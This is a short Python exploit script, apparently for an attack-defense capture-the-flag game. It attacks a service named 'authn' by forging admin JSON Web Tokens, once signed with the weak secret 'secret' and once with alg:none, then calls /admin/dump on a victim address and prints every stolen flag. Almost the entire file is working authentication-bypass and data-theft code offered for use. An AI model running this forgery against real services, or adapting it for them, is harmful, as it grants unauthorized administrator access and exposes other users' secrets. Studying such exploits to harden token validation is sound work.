#!/usr/bin/env python3
"""authn — подделка JWT. Сервис принимает слабый секрет "secret" И alg:none,
т.е. подпись не проверяется. Выписываем себе admin-токен и дёргаем /admin/dump,
который отдаёт секреты (флаги) всех.
Запуск: authn.py <ip_жертвы> [порт]  (флаги построчно в stdout).
Нужен PyJWT (см. requirements.txt)."""
import base64
import json
import os
import re
import sys

import jwt  # PyJWT
import requests

FLAG = re.compile(os.environ.get("FLAG_FORMAT", r"[A-Z0-9]{31}="))
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", "5007"))
BASE = f"http://{HOST}:{PORT}"


def _b64(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _forge_tokens():
    payload = {"user": "attacker", "admin": True}
    # 1) подпись слабым секретом "secret" (HS256) — сервис его «проверяет».
    yield jwt.encode(payload, "secret", algorithm="HS256")
    # 2) токен alg:none с пустой подписью — сервис принимает и это.
    yield _b64({"alg": "none", "typ": "JWT"}) + "." + _b64(payload) + "."


flags = set()
for tok in _forge_tokens():
    try:
        r = requests.get(f"{BASE}/admin/dump",
                         headers={"Authorization": tok}, timeout=5)
    except requests.RequestException:
        continue
    if r.status_code == 200:
        for s in r.json().get("secrets", []):
            flags.update(FLAG.findall(str(s)))
        if flags:
            break

for f in sorted(flags):
    print(f)
